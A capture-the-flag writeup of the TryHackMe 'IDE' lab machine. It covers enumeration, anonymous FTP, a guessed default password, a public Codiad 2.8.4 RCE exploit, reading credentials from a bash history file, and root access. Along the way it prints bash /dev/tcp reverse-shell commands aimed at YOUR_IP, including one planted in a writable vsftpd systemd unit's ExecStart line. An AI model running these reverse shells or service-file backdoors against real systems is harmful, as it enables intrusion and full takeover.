---
sidebar_position: 8
---

# Tryhackme IDE Writeup

Link to machine page on TryHackme => https://tryhackme.com/room/ide

# Enumeration

## rustscan nmap
```bash
└─$ rustscan -a 10.10.134.57 -- -A    

Open 10.10.134.57:21
Open 10.10.134.57:22
Open 10.10.134.57:80
Open 10.10.134.57:62337

PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:YOUR_IP
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC94RvPaQ09Xx+jMj32opOMbghuvx4OeBVLc+/4Hascmrtsa+SMtQGSY7b+eyW8Zymxi94rGBIN2ydPxy3XXGtkaCdQluOEw5CqSdb/qyeH+L/1PwIhLrr+jzUoUzmQil+oUOpVMOkcW7a00BMSxMCij0HdhlVDNkWvPdGxKBviBDEKZAH0hJEfexz3Tm65cmBpMe7WCPiJGTvoU9weXUnO3+41Ig8qF7kNNfbHjTgS0+XTnDXk03nZwIIwdvP8dZ8lZHdooM8J9u0Zecu4OvPiC4XBzPYNs+6ntLziKlRMgQls0e3yMOaAuKfGYHJKwu4AcluJ/+g90Hr0UqmYLHEV
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBzKTu7YDGKubQ4ADeCztKu0LL5RtBXnjgjE07e3Go/GbZB2vAP2J9OEQH/PwlssyImSnS3myib+gPdQx54lqZU=
|   256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ+oGPm8ZVYNUtX4r3Fpmcj9T9F2SjcRg4ansmeGR3cP
80/tcp    open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
62337/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: B4A327D2242C42CF2EE89C623279665F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Codiad 2.8.4
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


```

Web servers are running on both port 80 and 62337.

On port 62337, there seems to be an application running - Codiad 2.8.4.

Searching for it on Google yields this => https://github.com/Codiad/Codiad. Its a Cloud based IDE, hence the name of the machine I guess.

## FTP Server Enum

The server seems to be support anonymous login(from nmap output). Let's see what we can get from it.

```bash
└─$ ftp ide.thm
Connected to ide.thm.
220 (vsFTPd 3.0.3)
Name (ide.thm:kali): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||16569|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||24477|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
drwxr-xr-x    2 0        0            4096 Jun 18  2021 ...
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||15019|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             151 Jun 18  2021 -
drwxr-xr-x    2 0        0            4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
ftp> get -
local: - remote: -
229 Entering Extended Passive Mode (|||16831|)
150 Opening BINARY mode data connection for - (151 bytes).
100% |****************************************************************************************************************|   151      150.93 KiB/s    00:00 ETA
226 Transfer complete.
151 bytes received in 00:00 (0.85 KiB/s)
ftp> exit
221 Goodbye.

```

After downloading it, let's rename THE `-` file and see what's inside.

```bash
┌──(kali㉿kali)-[~/Documents/ctf/thm_easy_ide]
└─$ mv - ftp_file                      

└─$ cat ftp_file            
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.

```

So there's two possible usernames `john` and `drac`. 

## Web Server Enum [Port 80]

Let's see if we can find anything interesting here.

```bash
root@ip-10-10-0-98:~/ide# ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://ide.thm/FUZZ -o ffuf/raftLarge -of html -ic -r -recursion -c -e .txt,.html,.bak,.gz,.zip,.php,.db,.sql,.tar.gz -sf

index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376]
server-status           [Status: 403, Size: 272, Words: 20, Lines: 10]
.php                    [Status: 403, Size: 272, Words: 20, Lines: 10]
.html                   [Status: 403, Size: 272, Words: 20, Lines: 10]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376]
.html                   [Status: 403, Size: 272, Words: 20, Lines: 10]
.php                    [Status: 403, Size: 272, Words: 20, Lines: 10]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376]

:: Progress: [622750/622750] :: Job [1/1] :: 10508 req/sec :: Duration: [0:01:05] :: Errors: 30 ::

root@ip-10-10-0-98:~/ide# ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://ide.thm/FUZZ -o ffuf/big -of html -ic -r -recursion -c -e .txt,.html,.bak,.gz,.zip,.php,.db,.sql,.tar.gz -sf

:: Progress: [204730/204730] :: Job [1/1] :: 12140 req/sec :: Duration: [0:00:22] :: Errors: 0 ::

root@ip-10-10-0-98:~/ide# ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://ide.thm/FUZZ -o ffuf/dirMedium -of html -ic -r -recursion -c -e .txt,.html,.bak,.gz,.zip,.php,.db,.sql,.tar.gz -sf

:: Progress: [2076300/2076300] :: Job [1/1] :: 3482 req/sec :: Duration: [0:06:32] :: Errors: 0 ::

```

Nothing here at all for us it seems. Let's move on.

## Web Server Enum [Port 62337]

When we visit the site http://ide.thm:62337, there is a login portal.

*admin:admin* does not work. Neither does *john:admin* or *drac:admin*.

There are RCE exploits available for Codiad 2.8.4, but they require authentication. We will have to find a way to get the creds.

In the mean time, let's fuzz the portal and see what we can find.

```bash
root@ip-10-10-0-98:~/ide# ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://ide.thm:62337/FUZZ -o ffuf/raftLarge -of html -ic -r -recursion -c -e .txt,.html,.bak,.gz,.zip,.php,.db,.sql,.tar.gz -sf

js                      [Status: 200, Size: 3697, Words: 229, Lines: 30]
plugins                 [Status: 200, Size: 937, Words: 62, Lines: 17]
themes                  [Status: 200, Size: 1131, Words: 75, Lines: 18]
components              [Status: 200, Size: 3938, Words: 244, Lines: 32]
data                    [Status: 200, Size: 1944, Words: 134, Lines: 22]
lib                     [Status: 200, Size: 1173, Words: 78, Lines: 18]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
common.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
languages               [Status: 200, Size: 4609, Words: 305, Lines: 36]
index.php               [Status: 200, Size: 5239, Words: 1739, Lines: 87]
INSTALL.txt             [Status: 200, Size: 634, Words: 93, Lines: 22]
workspace               [Status: 200, Size: 941, Words: 66, Lines: 17]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10]
.html                   [Status: 403, Size: 275, Words: 20, Lines: 10]
.php                    [Status: 403, Size: 275, Words: 20, Lines: 10]
                        [Status: 200, Size: 5239, Words: 1739, Lines: 87]
LICENSE.txt             [Status: 200, Size: 1133, Words: 191, Lines: 21]
style_guide.php         [Status: 200, Size: 24394, Words: 7692, Lines: 328]
.php                    [Status: 403, Size: 275, Words: 20, Lines: 10]
                        [Status: 200, Size: 5239, Words: 1739, Lines: 87]
.html                   [Status: 403, Size: 275, Words: 20, Lines: 10]

:: Progress: [622750/622750] :: Job [1/1] :: 9664 req/sec :: Duration: [0:02:45] :: Errors: 30 ::
```

Dir listing seems to be enabled. Some examples
- http://ide.thm:62337/js/
- http://ide.thm:62337/data/

Now I go back to the login page and take a guess at the password, since the notes in the FTP server mentioned "default password". 

`john:CENSORED`.

*HINT:* This is a very commonly used password and I got lucky when I guessed it.

Now let's try and use those exploits to see if we can get some RCE. 

```bash
└─$ searchsploit codiad 2.8.4
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Codiad 2.8.4 - Remote Code Execution (Authenticated)                                                                       | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)                                                                   | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)                                                                   | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)                                                                   | multiple/webapps/50474.txt
--------------------------------------------------------------------------------------------------------------------------- --------------------------------
```

# Foothold

Let's use this exploit => https://www.exploit-db.com/exploits/49705

Running the exploit.

```bash
└─$ python3 49705.py http://10.10.180.194:62337/ john CENSORED YOUR_IP 4444 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/YOUR_IP/4445 0>&1 2>&1"' | nc -lnvp 4444
nc -lnvp 4445
[+] Please confirm that you have done the two command above [y/n]
[Y/n] Y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"john"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"CloudCall","path":"\/var\/www\/html\/codiad_projects"}}
[+] Writeable Path : /var/www/html/codiad_projects
[+] Sending payload...

--- ---

└─$ echo 'bash -c "bash -i >/dev/tcp/YOUR_IP/4445 0>&1 2>&1"' | nc -lnvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.180.194.
Ncat: Connection from 10.10.180.194:38116.
                                                                                                                                                             
┌──(kali㉿kali)-[~/Documents/ctf/thm_easy_ide]

--- ---

└─$ ncat -lnvp 4445                             
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4445
Ncat: Listening on 0.0.0.0:4445
Ncat: Connection from 10.10.180.194.
Ncat: Connection from 10.10.180.194:47536.
bash: cannot set terminal process group (906): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ide:/var/www/html/codiad/components/filemanager$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ide:/var/www/html/codiad/components/filemanager$ 
```

Now, this process of starting a reverse shell is pretty complicated. So instead, I am gonna upload a reverse shell.

Uploaded my own PHP reverse shell using `nc`. Remember that dir listing is enabled. So we can access it directly at http://ide.thm:62337/data/rshell.php
```bash
www-data@ide:/var/www/html/codiad/data$ ls -l
total 36
-rw-r--r-- 1 www-data www-data   18 Jun 18  2021 README
-rw-r--r-- 1 www-data www-data  311 Nov  8 07:48 active.php
drwxr-xr-x 2 www-data www-data 4096 Nov  8 07:46 cache
-rw-r--r-- 1 www-data www-data   82 Jun 18  2021 projects.php
-rw-r--r-- 1 www-data www-data 5493 Nov  8 08:11 rshell.php
-rw-r--r-- 1 www-data www-data   52 Jun 18  2021 settings.php
-rw-r--r-- 1 www-data www-data  138 Nov  8 07:46 users.php
-rw-r--r-- 1 www-data www-data   79 Jun 18  2021 version.php

```

We cannot read `user.txt` in `/home/drac`. We will need to find a way to pivot to the `drac` user. 
```bash
www-data@ide:/home/drac$ ls -l
total 4
-r-------- 1 drac drac 33 Jun 18  2021 user.txt
```

# Privesc

## lse run

Running `lse` first. Note the very old Linux Kernel.

```bash

ser: www-data
     User ID: 33
    Password: none
        Home: /var/www
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
       umask: 0000

    Hostname: ide
       Linux: 4.15.0-147-generic
Distribution: Ubuntu 18.04.5 LTS
Architecture: x86_64

[*] usr020 Are there other users in administrative groups?................. yes!
---
adm:x:4:syslog
sudo:x:27:drac
---
[*] usr030 Other users with shell.......................................... yes!
---
root:x:0:0:root:/root:/bin/bash
drac:x:1000:1000:drac:/home/drac:/bin/bash

[*] sud050 Do we know if any other users used sudo?........................ yes!
---
drac

[*] fst100 Useful binaries................................................. yes!
---
/usr/bin/curl
/usr/bin/dig
/bin/nc.openbsd
/bin/nc
/bin/netcat
/usr/bin/wget

[*] sys050 Can root user log in via SSH?................................... yes!
---
PermitRootLogin yes

[*] pro020 Processes running with root permissions......................... yes!
---
START      PID     USER COMMAND
START      PID     USER COMMAND
08:24    28942     root sleep 15                                                                                                                             
08:24    28939     root /bin/sh -c for i in 0 1 2 3; do rm -rf /var/www/html/config.php /var/www/html/data & sleep 15; done;
08:24    28938     root /usr/sbin/CRON -f
08:23     5438     root sleep 15
08:23     2632     root sleep 15
08:23     2630     root /bin/sh -c for i in 0 1 2 3; do rm -rf /var/www/html/config.php /var/www/html/data & sleep 15; done;

[!] cve-2021-4034 Checking for PwnKit vulnerability........................ yes!
---
Vulnerable! polkit version: 0.105-20ubuntu0.18.04.5
```

That process running as `root`, where the `config.php` is being deleted is interesting. The thing is, those files `config.php` and `data` don't exist. 

## linpeas run

```bash
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                          
OS: Linux version 4.15.0-147-generic (buildd@lcy01-amd64-028) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #151-Ubuntu SMP Fri Jun 18 19:21:19 UTC 2021
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: ide
Writable folder: /dev/shm

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034                                                                                                                                  

Potentially Vulnerable to CVE-2022-2588

════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                           
                ╚════════════════════════════════════════════════╝                                                                                           
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes     

root       841  0.0  0.3  30028  3180 ?        Ss   07:11   0:00 /usr/sbin/cron -f
root      2628  0.0  0.3  57500  3200 ?        S    08:23   0:00  _ /usr/sbin/CRON -f
root      2630  0.0  0.0   4628   808 ?        Ss   08:23   0:00      _ /bin/sh -c for i in 0 1 2 3; do rm -rf /var/www/html/config.php /var/www/html/data & sleep 15; done;

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                              

╔══════════╣ Users with console
drac:x:1000:1000:drac:/home/drac:/bin/bash                                                                                                                   
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                              
/usr/bin/curl
/usr/bin/lxc
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
/usr/share/gcc-8                             

╔══════════╣ Searching passwords in history files
mysql -u drac -p 'CENSORED'       
```

Well well we hit the jackpot. To confirm this, let's go check the history file ourselves.

```bash
www-data@ide:/home/drac$ cat .bash_history 
mysql -u drac -p 'CENSORED'
```

Should have checked the history file first saved ourselves some time. Anyway, let's try ssh login with these creds.
Success!!

```bash
drac@ide:~$ id
uid=1000(drac) gid=1000(drac) groups=1000(drac),24(cdrom),27(sudo),30(dip),46(plugdev)
```

No need for the reverse shell any more.

### Privesc from drac to root

```bash
drac@ide:~$ sudo -l
[sudo] password for drac: 
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

Interesting. This was confusing to look at first. 

But if you have installed software and administered a system before, you would recognize the command. 

`vsftpd` has been configured to run as a *systemd* service. The usual command to check the service status is `systemctl status vsftpd`. Any guide to installing and configuring `vsftpd` should have similar commands. Example -> https://www.howtoforge.com/tutorial/install-and-configure-vsftpd-server-on-ubuntu-1804/

Anyway, let's check the service status
```bash
drac@ide:/dev/shm$ systemctl status vsftpd
● vsftpd.service - vsftpd FTP server
   Loaded: loaded (/lib/systemd/system/vsftpd.service; enabled; vendor preset: enabled)
   Active: active (running) since Tue 2022-11-08 09:28:50 UTC; 27min ago
  Process: 1278 ExecStartPre=/bin/mkdir -p /var/run/vsftpd/empty (code=exited, status=0/SUCCESS)
 Main PID: 1289 (vsftpd)
    Tasks: 1 (limit: 1103)
   CGroup: /system.slice/vsftpd.service
           └─1289 /usr/sbin/vsftpd /etc/vsftpd.conf
```

You can not only check the `status` but also stop, start and restart the service, with the right permissions.

The file of interest to us here is `/lib/systemd/system/vsftpd.service`. Contents of said file as follows:
```
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target
```

Let's see if we have permissions to modify this file
```bash
drac@ide:/dev/shm$ ls -l /lib/systemd/system/

-rw-rw-r-- 1 root drac  248 Aug  4  2021 vsftpd.service
```
Yes we do :)

Let's modify the *ExecStart* attribute in the config file, to create a TCP reverse shell to send us a connection whenever the service is restarted.
```
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/YOUR_IP/443 0>&1 ; /usr/sbin/vsftpd /etc/vsftpd.conf"
```

You will need to run `systemctl daemon-reload` after modifying the file to reload the config. Source: https://www.shellhacks.com/systemd-service-file-example/

```bash
drac@ide:/dev/shm$ cp /lib/systemd/system/vsftpd.service vsftpd.service.bak
drac@ide:/dev/shm$ vim /lib/systemd/system/vsftpd.service 
drac@ide:/dev/shm$ systemctl daemon-reload
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.                                                                                                      
Authenticating as: drac
Password: 
==== AUTHENTICATION COMPLETE ===
drac@ide:/dev/shm$ systemctl status vsftpd.service                                                                                               
● vsftpd.service - vsftpd FTP server
   Loaded: loaded (/lib/systemd/system/vsftpd.service; enabled; vendor preset: enabled)
   Active: active (running) since Tue 2022-11-08 10:09:52 UTC; 8min ago
 Main PID: 30361 (vsftpd)
    Tasks: 1 (limit: 1103)
   CGroup: /system.slice/vsftpd.service
           └─30361 /usr/sbin/vsftpd /etc/vsftpd.conf

```

Its good to check the service status again, to ensure that our modification of the `vsftpd.service` file did not result in any errors. Otherwise we would see a "Loaded: error"

**NOTE:** Initially I did not add the `/bin/bash -c` part to the *ExecStart* string. Its only after getting errors and asking for a hint on the THM Discord that I figured out that it had to be done this way.

Now, the moment of truth.
```bash
drac@ide:/dev/shm$ sudo /usr/sbin/service vsftpd restart

---
└─$ ncat -lnvp 443 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.180.194.
Ncat: Connection from 10.10.180.194:56246.
bash: cannot set terminal process group (31614): Inappropriate ioctl for device
bash: no job control in this shell
root@ide:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ide:/# 

```

DONE!! Have a great day!!
